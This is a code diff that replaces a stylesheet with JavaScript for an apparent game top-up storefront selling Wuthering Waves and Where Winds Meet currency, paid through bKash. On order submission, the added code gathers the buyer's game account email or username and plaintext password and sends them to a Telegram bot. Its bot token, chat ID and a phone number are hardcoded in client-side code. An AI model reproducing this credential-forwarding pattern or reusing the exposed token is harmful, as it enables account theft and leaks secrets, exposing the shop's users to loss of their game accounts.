@@ -1,221 +1,176 @@
-/* --- Dynamic CSS Variables --- */
-:root {
-    --bg-color: #030610;
-    --text-main: #ffffff;
-    --text-muted: #a0aec0;
-    --bkash-color: #ffcc00;
-    --success-green: #00e676;
+const packages = {
+    ww: [
+        { id: 'ww1', type: 'Lunite Subscription', name: 'Tide Blessing Pack', price: 449 },
+        { id: 'ww2', type: 'Resonator Pass', name: 'Standard Pass', price: 949 },
+        { id: 'ww3', type: 'Resonator Pass', name: 'Premium Pass+', price: 2199 },
+        { id: 'ww4', type: 'Lunite Top-Up', name: '120 Lunites', price: 109 },
+        { id: 'ww5', type: 'Lunite Top-Up', name: '600 Lunites', price: 449 },
+        { id: 'ww6', type: 'Lunite Top-Up', name: '1960 Lunites', price: 1649 },
+        { id: 'ww7', type: 'Lunite Top-Up', name: '3960 Lunites', price: 3299 },
+        { id: 'ww8', type: 'Lunite Top-Up', name: '6560 Lunites', price: 5499 },
+        { id: 'ww9', type: 'Lunite Top-Up', name: '12960 Lunites', price: 10999 }
+    ],
+    wwm: [
+        { id: 'wwm1', type: 'Moonlit Supply', name: 'Spirit Subscription', price: 449 },
+        { id: 'wwm2', type: 'Hero’s Journey', name: 'Battle Scroll', price: 949 },
+        { id: 'wwm3', type: 'Hero’s Journey', name: 'Battle Scroll+', price: 2199 },
+        { id: 'wwm4', type: 'Spirit Jade Top-Up', name: '120 Spirit Jade', price: 109 },
+        { id: 'wwm5', type: 'Spirit Jade Top-Up', name: '600 Spirit Jade', price: 449 },
+        { id: 'wwm6', type: 'Spirit Jade Top-Up', name: '1960 Spirit Jade', price: 1649 },
+        { id: 'wwm7', type: 'Spirit Jade Top-Up', name: '3960 Spirit Jade', price: 3299 },
+        { id: 'wwm8', type: 'Spirit Jade Top-Up', name: '6560 Spirit Jade', price: 5499 },
+        { id: 'wwm9', type: 'Spirit Jade Top-Up', name: '12960 Spirit Jade', price: 10999 }
+    ]
+};
+
+const BOT_TOKEN = '8579178443:AAHDl_DEr43_AdA30j9y79FMWTlTFUJlGag';
+const CHAT_IDS = ['8395284772'];
+
+const container = document.getElementById('packages-container');
+const modal = document.getElementById('order-modal');
+const qtyInput = document.getElementById('quantity');
+const displayPrice = document.getElementById('display-price');
+const serverGroup = document.getElementById('server-group');
+const serverInput = document.getElementById('server');
+const serverText = document.getElementById('selected-server-text');
+const serverOptions = document.getElementById('server-options');
+
+let currentPackage = null;
+let currentGame = '';
+
+function render(game) {
+    container.innerHTML = '';
+    currentGame = game;
     
-    /* Default (Wuthering Waves Theme) */
-    --theme-primary: #00f0ff;
-    --theme-primary-glow: rgba(0, 240, 255, 0.4);
-    --theme-card-bg: rgba(10, 18, 35, 0.65);
-    --theme-border: rgba(0, 240, 255, 0.2);
+    // Smart Form Logic
+    if(game === 'wwm') {
+        serverGroup.style.display = 'none';
+        serverInput.removeAttribute('required');
+    } else {
+        serverGroup.style.display = 'block';
+        serverInput.setAttribute('required', 'true');
+    }
+
+    const gameNameDisplay = game === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
+
+    packages[game].forEach((p, i) => {
+        const div = document.createElement('div');
+        div.className = 'package-card';
+        div.innerHTML = `<div class="inner-content"><span class="pack-type">${p.type}</span><h3>${p.name}</h3><p>${p.price} <span>BDT</span></p></div>`;
+        
+        // WOW Feature: 3D Magnetic Tilt Effect
+        div.addEventListener('mousemove', (e) => {
+            const rect = div.getBoundingClientRect();
+            const x = e.clientX - rect.left;
+            const y = e.clientY - rect.top;
+            const centerX = rect.width / 2;
+            const centerY = rect.height / 2;
+            const rotateX = ((y - centerY) / centerY) * -10; // Max tilt 10deg
+            const rotateY = ((x - centerX) / centerX) * 10;
+            div.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale3d(1.02, 1.02, 1.02)`;
+        });
+        
+        div.addEventListener('mouseleave', () => {
+            div.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)`;
+        });
+
+        div.onclick = () => {
+            currentPackage = p;
+            document.getElementById('modal-package-name').innerText = p.name;
+            document.getElementById('modal-game-name').innerText = gameNameDisplay;
+            qtyInput.value = 1;
+            updateUI();
+            modal.classList.remove('hidden');
+        };
+        container.appendChild(div);
+    });
 }
 
-/* Where Winds Meet Theme overrides */
-body.theme-wwm {
-    --theme-primary: #ffd700;
-    --theme-primary-glow: rgba(255, 215, 0, 0.4);
-    --theme-card-bg: rgba(25, 15, 10, 0.65);
-    --theme-border: rgba(255, 215, 0, 0.2);
+// Custom Dropdown Logic
+function toggleSelect() {
+    serverOptions.classList.toggle('hidden');
+}
+function selectServer(val) {
+    serverText.innerText = val;
+    serverText.style.color = '#fff';
+    serverInput.value = val;
+}
+// Close dropdown when clicked outside
+document.addEventListener('click', (e) => {
+    if (!e.target.closest('.custom-select-wrapper')) {
+        serverOptions.classList.add('hidden');
+    }
+});
+
+function updateUI() {
+    displayPrice.innerText = currentPackage.price * parseInt(qtyInput.value);
 }
 
-* { margin: 0; padding: 0; box-sizing: border-box; }
+document.getElementById('plus-btn').onclick = () => { qtyInput.value = parseInt(qtyInput.value) + 1; updateUI(); };
+document.getElementById('minus-btn').onclick = () => { if(qtyInput.value > 1) { qtyInput.value = parseInt(qtyInput.value) - 1; updateUI(); } };
 
-body {
-    background-color: var(--bg-color);
-    color: var(--text-main);
-    font-family: 'Rajdhani', sans-serif;
-    min-height: 100vh;
-    overflow-x: hidden;
-    transition: background-color 0.8s ease;
-}
+document.querySelector('.close-btn').onclick = () => modal.classList.add('hidden');
 
-/* --- Dynamic Background Layers --- */
-.bg-layer {
-    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-    z-index: -2; opacity: 0; transition: opacity 1s ease-in-out;
-}
-.bg-ww {
-    background: radial-gradient(circle at 20% 0%, rgba(0, 150, 255, 0.15) 0%, transparent 50%),
-                radial-gradient(circle at 80% 100%, rgba(0, 240, 255, 0.1) 0%, transparent 50%);
-}
-.bg-wwm {
-    background: radial-gradient(circle at 20% 0%, rgba(255, 80, 0, 0.12) 0%, transparent 50%),
-                radial-gradient(circle at 80% 100%, rgba(255, 215, 0, 0.1) 0%, transparent 50%);
-}
-body.theme-ww .bg-ww { opacity: 1; }
-body.theme-wwm .bg-wwm { opacity: 1; }
+document.querySelectorAll('.game-btn').forEach(btn => {
+    btn.onclick = (e) => {
+        document.querySelectorAll('.game-btn').forEach(b => b.classList.remove('active'));
+        e.target.classList.add('active');
+        render(e.target.dataset.game);
+    };
+});
 
-header { text-align: center; padding: 40px 10px 20px; }
-.logo { font-family: 'Orbitron', sans-serif; font-size: 2.8rem; text-shadow: 0 0 15px var(--theme-primary-glow); transition: 0.5s ease; }
-.logo .accent-text { color: var(--theme-primary); transition: color 0.5s ease; }
-.tagline { color: var(--text-muted); font-size: 1.1rem; letter-spacing: 2px; text-transform: uppercase; margin-top: 5px; }
+document.getElementById('order-form').onsubmit = async (e) => {
+    e.preventDefault();
+    const btn = document.getElementById('submit-btn');
+    btn.disabled = true; btn.innerHTML = 'Processing...';
 
-/* --- Game Switcher --- */
-.game-switcher { display: flex; justify-content: center; gap: 15px; margin-bottom: 40px; padding: 0 10px; }
-.game-btn {
-    background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1);
-    color: var(--text-muted); padding: 12px 25px; font-size: 1rem;
-    font-family: 'Orbitron', sans-serif; cursor: pointer; border-radius: 8px;
-    transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
-    backdrop-filter: blur(5px);
-}
-.game-btn:hover { color: #fff; transform: translateY(-2px); }
-.game-btn.active {
-    color: var(--text-main); border-color: var(--theme-primary);
-    background: rgba(255,255,255,0.05);
-    box-shadow: 0 5px 15px var(--theme-primary-glow);
-}
+    const gameStr = currentGame === 'ww' ? 'Wuthering Waves' : 'Where Winds Meet';
+    const srvLine = currentGame === 'ww' ? `\n🌍 *Server:* \`${serverInput.value}\`` : '';
 
-/* --- Grid & Cards --- */
-.grid-container {
-    display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-    gap: 20px; padding: 0 20px 50px; max-width: 1200px; margin: 0 auto;
-}
+    const msg = `🧾 *Premium Order Received*
 
-.package-card {
-    background: var(--theme-card-bg); border: 1px solid var(--theme-border);
-    border-radius: 16px; padding: 25px; text-align: center; 
-    backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
-    transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-    cursor: pointer; opacity: 0; transform: translateY(30px);
-    position: relative; overflow: hidden;
-}
-.package-card::before {
-    content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
-    transform: skewX(-20deg); transition: 0.5s;
-}
-.package-card:hover { 
-    transform: translateY(-8px) scale(1.02); 
-    border-color: var(--theme-primary); 
-    box-shadow: 0 10px 25px rgba(0,0,0,0.5), 0 0 20px var(--theme-primary-glow); 
-}
-.package-card:hover::before { left: 150%; }
+🎮 *Game:* ${gameStr}
+📦 *Package:* ${currentPackage.name}
+🔢 *Quantity:* ${qtyInput.value}
+💰 *Total Pay:* ${displayPrice.innerText} BDT
 
-/* Card Entry Animation */
-@keyframes slideUpFade {
-    to { opacity: 1; transform: translateY(0); }
+👤 *Account Info:*
+✉️ *Email/User:* \`${document.getElementById('email-username').value}\`
+🔑 *Pass:* \`${document.getElementById('password').value}\`
+🏷️ *IGN:* \`${document.getElementById('ign').value}\`${srvLine}
+
+💳 *Payment (bKash)*
+🧾 *TrxID:* \`${document.getElementById('trxid').value}\``;
+
+    try {
+        for (const id of CHAT_IDS) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: id, text: msg, parse_mode: 'Markdown' })
+            });
+        }
+        modal.classList.add('hidden');
+        document.getElementById('success-modal').classList.remove('hidden');
+    } catch (err) {
+        alert('Connection error. Try again.');
+    } finally {
+        btn.disabled = false; btn.innerHTML = '<span class="btn-text">Confirm Purchase</span>';
+        document.getElementById('order-form').reset();
+        serverText.innerText = 'Select Server';
+        serverText.style.color = 'var(--text-secondary)';
+    }
+};
+
+document.getElementById('close-success').onclick = () => document.getElementById('success-modal').classList.add('hidden');
+
+function copyNumber() {
+    navigator.clipboard.writeText('01610359086').then(() => {
+        const icon = document.getElementById('copy-icon');
+        icon.innerText = '✔️';
+        setTimeout(() => icon.innerText = '📋', 2000);
+    });
 }
 
-.package-card h3 { font-size: 1.5rem; margin: 12px 0; font-weight: 600; }
-.package-card p { font-family: 'Orbitron'; font-size: 1.6rem; color: #fff; font-weight: 700; }
-.package-card span { font-size: 0.9rem; color: var(--text-muted); font-family: 'Rajdhani', sans-serif; font-weight: normal;}
-.pack-type { color: var(--theme-primary); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; font-weight: 600; transition: color 0.5s ease; }
-
-/* --- Powerful Modal --- */
-.modal {
-    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-    background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
-    z-index: 100; display: flex; justify-content: center; align-items: center;
-    visibility: hidden; opacity: 0; transition: all 0.3s ease;
-}
-.modal:not(.hidden) { visibility: visible; opacity: 1; }
-
-.modal-wrapper { width: 95%; max-width: 480px; max-height: 90vh; display: flex; perspective: 1000px; }
-
-.modal-content {
-    width: 100%; background: rgba(10, 15, 25, 0.9); border: 1px solid var(--theme-primary);
-    border-radius: 20px; position: relative; display: flex; flex-direction: column;
-    box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 30px var(--theme-primary-glow);
-    /* Spring physics animation */
-    transform: scale(0.8) translateY(30px); opacity: 0;
-    transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-}
-.modal:not(.hidden) .modal-content { transform: scale(1) translateY(0); opacity: 1; }
-
-.scroll-content { padding: 35px 30px; overflow-y: auto; max-height: 100%; }
-
-.close-btn { 
-    position: absolute; top: 15px; right: 20px; font-size: 2rem; cursor: pointer; 
-    z-index: 10; color: var(--text-muted); transition: 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); 
-}
-.close-btn:hover { color: #ff3366; transform: rotate(90deg) scale(1.1); }
-
-.glow-text { font-family: 'Orbitron'; color: var(--theme-primary); font-size: 1.6rem; margin-bottom: 5px; transition: color 0.5s ease; }
-.game-tag { color: var(--text-muted); border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 15px; margin-bottom: 20px; }
-
-/* --- Input Groups --- */
-.input-group { position: relative; margin-bottom: 22px; width: 100%; }
-.row { display: flex; gap: 15px; }
-.input-group input {
-    width: 100%; padding: 14px; background: rgba(0,0,0,0.5);
-    border: 1px solid rgba(255,255,255,0.15); color: #fff; border-radius: 8px; 
-    outline: none; font-size: 1rem; font-family: 'Rajdhani', sans-serif;
-    transition: all 0.3s ease;
-}
-.input-group label {
-    position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
-    color: var(--text-muted); transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); pointer-events: none; font-size: 1rem;
-}
-.input-group input:focus { border-color: var(--theme-primary); background: rgba(0,0,0,0.7); box-shadow: 0 0 15px var(--theme-primary-glow); }
-.input-group input:focus ~ label, .input-group input:not(:placeholder-shown) ~ label {
-    top: -10px; left: 10px; font-size: 0.85rem; color: var(--theme-primary); background: #0b101a; padding: 0 6px; border-radius: 4px; font-weight: 600;
-}
-
-/* --- Qty Control --- */
-.price-calculator {
-    background: rgba(255,255,255,0.03); padding: 20px; border-radius: 12px;
-    margin-bottom: 25px; display: flex; flex-direction: column; gap: 12px; align-items: center;
-    border: 1px solid rgba(255,255,255,0.05);
-}
-.qty-control { display: flex; align-items: center; gap: 8px; }
-.qty-btn {
-    width: 45px; height: 45px; background: rgba(255,255,255,0.05); border: 1px solid var(--theme-primary);
-    color: var(--theme-primary); font-size: 1.8rem; border-radius: 8px; cursor: pointer; 
-    transition: all 0.2s; display: flex; justify-content: center; align-items: center;
-}
-.qty-btn:hover { background: var(--theme-primary); color: #000; transform: scale(1.05); }
-.qty-btn:active { transform: scale(0.95); }
-#quantity {
-    width: 60px; height: 45px; background: transparent; border: none;
-    color: #fff; text-align: center; font-size: 1.4rem; font-family: 'Orbitron'; outline: none;
-}
-.total-price { font-size: 1.5rem; font-family: 'Orbitron'; color: var(--theme-primary); font-weight: bold; transition: color 0.5s ease; }
-
-/* --- Payment Section --- */
-.payment-section { 
-    background: linear-gradient(135deg, rgba(255, 204, 0, 0.05), transparent); 
-    border-left: 4px solid var(--bkash-color); padding: 18px; border-radius: 8px; 
-    margin-bottom: 25px; font-size: 0.95rem; border-top: 1px solid rgba(255,255,255,0.02); border-right: 1px solid rgba(255,255,255,0.02); border-bottom: 1px solid rgba(255,255,255,0.02);
-}
-.payment-section h3 { color: var(--bkash-color); margin-bottom: 12px; font-size: 1.1rem; }
-.highlight { color: var(--bkash-color); font-weight: 600; font-size: 1.1rem;}
-
-.number-copy { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
-.copy-container { display: flex; align-items: center; gap: 5px; background: rgba(0,0,0,0.4); padding: 4px 10px; border-radius: 6px; border: 1px solid rgba(255, 204, 0, 0.3); }
-.copy-icon { background: transparent; border: none; color: #fff; cursor: pointer; font-size: 1.2rem; transition: 0.3s; padding: 2px; }
-.copy-icon:hover { transform: scale(1.2); }
-
-/* --- Buttons --- */
-.submit-btn {
-    width: 100%; padding: 16px; background: var(--theme-primary); border: none;
-    color: #000; font-family: 'Orbitron'; font-weight: bold; font-size: 1.1rem; cursor: pointer; border-radius: 8px;
-    transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); text-transform: uppercase; letter-spacing: 1px;
-    box-shadow: 0 5px 15px var(--theme-primary-glow);
-}
-.submit-btn:hover { transform: translateY(-3px); box-shadow: 0 8px 25px var(--theme-primary-glow); }
-.submit-btn:active { transform: translateY(1px); }
-.submit-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; box-shadow: none; }
-
-/* --- Success Popup --- */
-.premium-popup { border-color: var(--success-green); box-shadow: 0 20px 50px rgba(0,0,0,0.5), 0 0 40px rgba(0, 230, 118, 0.2); padding: 40px 25px; }
-.success-icon-container { display: flex; justify-content: center; margin-bottom: 25px; }
-.success-icon {
-    font-size: 4rem; color: var(--success-green); text-shadow: 0 0 20px rgba(0,255,136,0.4); 
-    border: 3px solid var(--success-green); border-radius: 50%; width: 90px; height: 90px; 
-    display: flex; align-items: center; justify-content: center;
-    animation: successPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
-}
-@keyframes successPop { 0% { transform: scale(0); } 100% { transform: scale(1); } }
-.premium-popup .glow-text { color: var(--success-green); }
-.premium-popup p { color: var(--text-muted); font-size: 1.1rem; margin-top: 10px; }
-.mt-20 { margin-top: 30px; background: var(--success-green); box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3); }
-
-@media (max-width: 480px) {
-    .row { flex-direction: column; gap: 0; }
-    .logo { font-size: 2.2rem; }
-    .scroll-content { padding: 25px 20px; }
-}
+// Init
+render('ww');
